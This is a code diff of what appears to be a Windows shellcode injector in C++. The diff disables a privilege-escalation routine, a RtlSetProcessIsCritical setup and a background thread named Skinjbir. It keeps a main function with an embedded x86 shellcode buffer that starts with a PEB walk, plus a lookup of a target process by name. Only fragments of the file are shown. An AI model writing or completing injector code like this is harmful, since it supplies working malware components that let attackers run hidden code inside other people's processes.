@@ -22,13 +22,13 @@ __forceinline void print_good(const char* format, T const& ... args)
     printf(format, args ...);
 }
 
-typedef long(WINAPI* RtlSetProcessIsCritical)(
+/*typedef long(WINAPI* RtlSetProcessIsCritical)(       // turned off because it's not stable
     IN BOOLEAN NewSettings,
     OUT BOOLEAN OldSettings,
     IN BOOLEAN CriticalStop
     );
 
-BOOL SetPrivilege(BOOL bEnablePrivilege) {
+ BOOL SetPrivilege(BOOL bEnablePrivilege) {                
     HANDLE Proc, hTocken;
     Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
     if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;
@@ -58,7 +58,7 @@ void Skinjbir() {
     }
 }
 
-
+*/ 
 DWORD GetPID(const char* pn)
 {
     DWORD procId = 0;
@@ -91,7 +91,6 @@ DWORD GetPID(const char* pn)
 int main(void)
 {
     BOOL wp = 0;
-    std::thread atk(Skinjbir);
     unsigned char ExecBuffer[] =
         "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
         "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
@@ -139,5 +138,4 @@ int main(void)
     }
     else
         print_bad("Process Not found (0x%lX)\n", GetLastError());
-    atk.join();
 }
